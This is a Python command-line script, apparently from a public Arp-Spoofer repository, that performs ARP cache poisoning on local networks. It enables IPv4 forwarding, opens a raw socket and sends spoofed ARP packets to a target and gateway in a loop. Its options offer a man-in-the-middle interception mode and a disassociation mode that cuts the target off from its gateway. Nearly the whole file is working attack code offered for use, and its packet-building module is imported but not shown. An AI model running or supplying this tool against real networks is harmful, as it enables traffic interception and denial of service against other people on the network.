#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

import argparse
import time
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW
from subprocess import CalledProcessError, check_call, DEVNULL

from packets import ARPSetupProxy


class Spoofer(object):
    def __init__(self, *, interface: str, attacker_mac: str,
                 gateway_mac: str, gateway_ip: str,
                 target_mac: str, target_ip: str,
                 interval: float, disassociate: bool,
                 ip_forwarding: bool):
        self.__interval = interval
        self.__ip_forwarding = ip_forwarding
        self.__arp = ARPSetupProxy(interface, attacker_mac, gateway_mac,
                                   gateway_ip, target_mac, target_ip,
                                   disassociate)

    def execute(self):
        try:
            if self.__ip_forwarding is True:
                self.__enable_ipv4_forwarding()
            self.__display_setup_prompt()
            self.__send_attack_packets()
        except KeyboardInterrupt:
            raise SystemExit('[!] ARP Spoofing attack aborted.')

    @staticmethod
    def __enable_ipv4_forwarding():
        try:
            check_call(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       stdout=DEVNULL, stderr=DEVNULL)
        except CalledProcessError:
            raise SystemExit('Error: Permission denied. Execute with '
                             'administrator privileges.')

    def __display_setup_prompt(self):
        print('\n[>>>] ARP Spoofing configuration:')
        configurations = {'IPv4 Forwarding': str(self.__ip_forwarding),
                          'Interface': self.__arp.interface,
                          'Attacker MAC': self.__arp.packets.attacker_mac,
                          'Gateway IP': self.__arp.packets.gateway_ip,
                          'Gateway MAC': self.__arp.packets.gateway_mac,
                          'Target IP': self.__arp.packets.target_ip,
                          'Target MAC': self.__arp.packets.target_mac}

        for setting, value in configurations.items():
            print('{0: >7} {1: <16}{2:.>25}'.format('[+]', setting, value))

        while True:
            proceed = input('\n[!] ARP packets ready. Execute the attack with '
                            'these settings? (Y/N) ').lower()
            if proceed == 'y':
                print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to '
                      'abort.')
                break
            if proceed == 'n':
                raise KeyboardInterrupt

    def __send_attack_packets(self):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.__arp.interface, htons(0x0800)))
            while True:
                for packet in self.__arp.packets:
                    sock.send(packet)
                time.sleep(self.__interval)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('targetip', type=str, metavar='TARGET_IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('-i', '--interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    parser.add_argument('--attackermac', type=str, metavar='MAC',
                        help='MAC address of the NIC from which the attacker '
                             'machine will send the spoofed ARP packets.')
    parser.add_argument('--gatemac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--interval', type=float, default=1, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 1 second).')
    parser.add_argument('-d', '--disassociate', action='store_true',
                        help='Execute a disassociation attack in which a '
                             'randomized MAC address is set for the attacker '
                             'machine, effectively making the target host send '
                             'packets to a non-existent gateway.')
    parser.add_argument('-f', '--ipforward', action='store_true',
                        help='Temporarily enable forwarding of IPv4 packets on '
                             'the attacker system until the next reboot. '
                             'Enable to intercept information between the '
                             'target host and the gateway, performing a '
                             'man-in-the-middle attack. Requires administrator '
                             'privileges.')
    cli_args = parser.parse_args()

    spoofer = Spoofer(interface=cli_args.interface,
                      attacker_mac=cli_args.attackermac,
                      gateway_mac=cli_args.gatemac,
                      gateway_ip=cli_args.gateip,
                      target_mac=cli_args.targetmac,
                      target_ip=cli_args.targetip,
                      interval=cli_args.interval,
                      disassociate=cli_args.disassociate,
                      ip_forwarding=cli_args.ipforward)
    spoofer.execute()
